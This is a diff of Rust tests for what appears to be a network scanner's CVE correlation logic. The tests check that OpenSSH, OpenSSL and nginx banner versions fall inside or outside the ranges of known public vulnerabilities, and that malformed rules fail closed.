+        let hit = correlate_with_rules("SSH-2.0-OpenSSH_8.0p1", &service(22), &rule);
+        assert!(!hit.is_empty(), "should match OpenSSH_8.0p1");
+        let miss = correlate_with_rules("SSH-2.0-OpenSSH_8.0a", &service(22), &rule);
+        assert!(miss.is_empty(), "should not match OpenSSH_8.0a");
+    }
+
+    #[test]
+    fn correlate_openssh_cve_2023_38408_semantic_range() {
+        // OpenSSH 8.5 and 7.9 should match CVE-2023-38408 (fixed in 9.3p2).
+        let hit_85 = correlate("SSH-2.0-OpenSSH_8.5p1", &service(22));
+        assert!(
+            hit_85.iter().any(|f| f.title().contains("CVE-2023-38408")),
+            "OpenSSH 8.5p1 should match CVE-2023-38408"
+        );
+
+        let hit_79 = correlate("SSH-2.0-OpenSSH_7.9", &service(22));
+        assert!(
+            hit_79.iter().any(|f| f.title().contains("CVE-2023-38408")),
+            "OpenSSH 7.9 should match CVE-2023-38408"
+        );
+
+        // OpenSSH 9.3p2 is the fixed release and must not match.
+        let miss_93p2 = correlate("SSH-2.0-OpenSSH_9.3p2", &service(22));
+        assert!(
+            !miss_93p2.iter().any(|f| f.title().contains("CVE-2023-38408")),
+            "OpenSSH 9.3p2 should not match CVE-2023-38408"
+        );
+    }
+
+    #[test]
+    fn correlate_openssh_cve_2024_6387_semantic_range() {
+        // regreSSHion: vulnerable in [8.5, 9.8); previously only 8.5 and 9.7 exact patterns fired.
+        let hit_86 = correlate("SSH-2.0-OpenSSH_8.6p1", &service(22));
+        assert!(
+            hit_86.iter().any(|f| f.title().contains("CVE-2024-6387")),
+            "OpenSSH 8.6p1 should match CVE-2024-6387"
+        );
+        let hit_90 = correlate("SSH-2.0-OpenSSH_9.0", &service(22));
+        assert!(
+            hit_90.iter().any(|f| f.title().contains("CVE-2024-6387")),
+            "OpenSSH 9.0 should match CVE-2024-6387"
+        );
+        let hit_97 = correlate("SSH-2.0-OpenSSH_9.7p1", &service(22));
+        assert!(
+            hit_97.iter().any(|f| f.title().contains("CVE-2024-6387")),
+            "OpenSSH 9.7p1 should match CVE-2024-6387"
+        );
+        let miss_98 = correlate("SSH-2.0-OpenSSH_9.8p1", &service(22));
+        assert!(
+            !miss_98.iter().any(|f| f.title().contains("CVE-2024-6387")),
+            "OpenSSH 9.8p1 should not match CVE-2024-6387"
+        );
+        let miss_84 = correlate("SSH-2.0-OpenSSH_8.4p1", &service(22));
+        assert!(
+            !miss_84.iter().any(|f| f.title().contains("CVE-2024-6387")),
+            "OpenSSH 8.4p1 is below min_version and must not match CVE-2024-6387"
+        );
+    }
+
+    #[test]
+    fn correlate_openssl_cve_2022_3602_semantic_range() {
+        let hit = correlate("OpenSSL/3.0.4", &service(443));
+        assert!(
+            hit.iter().any(|f| f.title().contains("CVE-2022-3602")),
+            "OpenSSL 3.0.4 should match SPOOKYSSL"
+        );
+        let hit_space = correlate("Server uses OpenSSL 3.0.2", &service(443));
+        assert!(
+            hit_space.iter().any(|f| f.title().contains("CVE-2022-3602")),
+            "space-separated OpenSSL 3.0.2 banner should match"
+        );
+        let miss = correlate("OpenSSL/3.0.7", &service(443));
+        assert!(
+            !miss.iter().any(|f| f.title().contains("CVE-2022-3602")),
+            "OpenSSL 3.0.7 should not match SPOOKYSSL"
+        );
+        let miss_old = correlate("OpenSSL/1.1.1", &service(443));
+        assert!(
+            !miss_old.iter().any(|f| f.title().contains("CVE-2022-3602")),
+            "OpenSSL 1.1.1 is outside SPOOKYSSL range"
+        );
+    }
+
+    #[test]
+    fn correlate_nginx_cve_2021_23017_semantic_range() {
+        let hit_119 = correlate("Server: nginx/1.19.0", &service(80));
+        assert!(
+            hit_119.iter().any(|f| f.title().contains("CVE-2021-23017")),
+            "nginx 1.19.0 should match CVE-2021-23017"
+        );
+        let hit_116 = correlate("Server: nginx/1.16.1", &service(80));
+        assert!(
+            hit_116.iter().any(|f| f.title().contains("CVE-2021-23017")),
+            "nginx 1.16.1 should match CVE-2021-23017"
+        );
+        let miss = correlate("Server: nginx/1.20.1", &service(80));
+        assert!(
+            !miss.iter().any(|f| f.title().contains("CVE-2021-23017")),
+            "nginx 1.20.1 should not match CVE-2021-23017"
+        );
+    }
+
+    #[test]
+    fn version_rule_matches_requires_range_constraints() {
+        let unconstrained = CveRule {
+            pattern: "openssh".into(),
+            cve: "CVE-9999-NORANGE".into(),
+            cvss: 9.0,
+            severity: Severity::Critical,
+            description: "product without range must not match all versions".into(),
+            exploit: None,
+            product: Some("openssh".into()),
+            min_version: None,
+            max_version: None,
+            fixed_version: None,
+        };
+        assert!(
+            !version_rule_matches(&[8, 5, 1], &unconstrained),
+            "product rule with no min/max/fixed must fail closed"
+        );
+    }
+
+    #[test]
+    fn parse_semver_handles_portable_suffix() {
+        assert_eq!(parse_semver("8.5p1"), Some(vec![8, 5, 1]));
+        assert_eq!(parse_semver("9.3p2"), Some(vec![9, 3, 2]));
+        assert_eq!(parse_semver("8.5"), Some(vec![8, 5]));
+    }
+
+    #[test]
+    fn cmp_semver_treats_missing_components_as_zero() {
+        assert_eq!(cmp_semver(&[8, 5], &[8, 5, 1]), std::cmp::Ordering::Less);
+        assert_eq!(cmp_semver(&[9, 3], &[9, 3, 2]), std::cmp::Ordering::Less);
+    }
+
+    #[test]
+    fn version_rule_matches_respects_fixed_version() {
+        let rule = CveRule {
+            pattern: "openssh".into(),
+            cve: "CVE-2023-38408".into(),
+            cvss: 9.8,
+            severity: Severity::Critical,
+            description: "OpenSSH < 9.3p2".into(),
+            exploit: None,
+            product: Some("openssh".into()),
+            min_version: None,
+            max_version: None,
+            fixed_version: Some("9.3p2".into()),
+        };
+        assert!(version_rule_matches(&[8, 5, 1], &rule));
+        assert!(version_rule_matches(&[9, 3, 1], &rule));
+        assert!(!version_rule_matches(&[9, 3, 2], &rule));
+        assert!(!version_rule_matches(&[9, 4], &rule));
+    }
+
+    #[test]
+    fn version_rule_matches_invalid_constraints_fail_closed() {
+        // Any declared min/max/fixed_version that does not parse as a semver
+        // vector must be treated as no-match, not silently unconstrained.
+        let base_rule = || CveRule {
+            pattern: "openssh".into(),
+            cve: "CVE-9999-SEMCLO".into(),
+            cvss: 9.0,
+            severity: Severity::Critical,
+            description: "test".into(),
+            exploit: None,
+            product: Some("openssh".into()),
+            min_version: None,
+            max_version: None,
+            fixed_version: None,
+        };
+
+        let mut with_bad_min = base_rule();
+        with_bad_min.min_version = Some("not-a-version".into());
+        assert!(!version_rule_matches(&[8, 5, 1],
+            &with_bad_min),
+            "unparseable min_version must be no-match");
+
+        let mut with_bad_max = base_rule();
+        with_bad_max.max_version = Some("".into());
+        assert!(!version_rule_matches(&[8, 5, 1],
+            &with_bad_max),
+            "unparseable max_version must be no-match");
+
+        let mut with_bad_fixed = base_rule();
+        with_bad_fixed.fixed_version = Some("1.2.3.4.5.6.7.8".into());
+        assert!(!version_rule_matches(&[8, 5, 1],
+            &with_bad_fixed),
+            "unparseable fixed_version must be no-match");
+    }
+
+    #[test]
+    fn community_rules_with_invalid_semver_constraints_are_skipped() {
+        let dir = std::env::temp_dir().join("gossan_cve_semver_skip_test");
+        let _ = std::fs::create_dir_all(&dir);
+        std::fs::write(
+            dir.join("invalid_semver.toml"),
+            r#"
+[[rule]]
+pattern = "badapp/1.0"
+cve = "CVE-9999-BAD1"
+cvss = 8.0
+severity = "high"
+description = "Bad semver rule."
+product = "badapp"
+fixed_version = "not-a-version"
+
+[[rule]]
+pattern = "goodapp/1.0"
+cve = "CVE-9999-GOOD1"
+cvss = 8.0
+severity = "high"
+description = "Good semver rule."
+product = "goodapp"
+fixed_version = "2.0.0"
+"#,
+        )
+        .unwrap();
+        let rules = load_community_rules(&dir);
+        assert_eq!(rules.len(), 1, "only the valid rule should be kept");
+        assert_eq!(rules[0].cve, "CVE-9999-GOOD1");
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[test]
+    fn correlate_openssl_heartbleed_letter_check() {
+        let rule = vec![CveRule {
+            pattern: "openssl/1.0.1".into(),
+            cve: "CVE-2014-0160".into(),
+            cvss: 7.5,
+            severity: Severity::High,
+            description: "Heartbleed".into(),
+            exploit: None,
+            product: None,
+            min_version: None,
+            max_version: None,
+            fixed_version: None,
+        }];
+        let hit = correlate_with_rules("OpenSSL/1.0.1f", &service(443), &rule);
+        assert!(!hit.is_empty(), "should match 1.0.1f");
+        let miss = correlate_with_rules("OpenSSL/1.0.1g", &service(443), &rule);
+        assert!(miss.is_empty(), "should not match 1.0.1g");
+    }
+}
+
+#[cfg(test)]
+mod proptests {
+    use super::*;
+    use gossan_core::{HostTarget, Protocol};
+    use proptest::prelude::*;
+    use std::net::IpAddr;
+
+    fn service(port: u16) -> ServiceTarget {
+        ServiceTarget {
+            host: HostTarget {
+                ip: IpAddr::from([127, 0, 0, 1]),
+                domain: Some("example.com".into()),
+            },
+            port,
+            protocol: Protocol::Tcp,
+            banner: None,
+            tls: port == 443,
+        }
+    }
+
+    proptest! {
+        #[test]
+        fn correlate_never_panics(
+            banner in "[\x20-\x7e]{0,200}",
+            pattern in "[a-z0-9/_.]{0,30}",
+        ) {
+            let rules = vec![CveRule {
+                pattern,
+                cve: "CVE-9999-PROP".into(),
+                cvss: 5.0,
+                severity: Severity::Medium,
+                description: "prop test".into(),
+                exploit: None,
+                product: None,
+                min_version: None,
+                max_version: None,
+                fixed_version: None,
+            }];
+            let _ = correlate_with_rules(&banner, &service(80), &rules);
+        }
+
+        #[test]
+        fn correlate_empty_pattern_never_panics(banner in "[\x20-\x7e]{0,200}") {
+            let rules = vec![CveRule {
+                pattern: String::new(),
+                cve: "CVE-9999-PROP".into(),
+                cvss: 5.0,
+                severity: Severity::Medium,
+                description: "prop test".into(),
+                exploit: None,
+                product: None,
+                min_version: None,
+                max_version: None,
+                fixed_version: None,
+            }];
+            let _ = correlate_with_rules(&banner, &service(80), &rules);
+        }
     }
 }
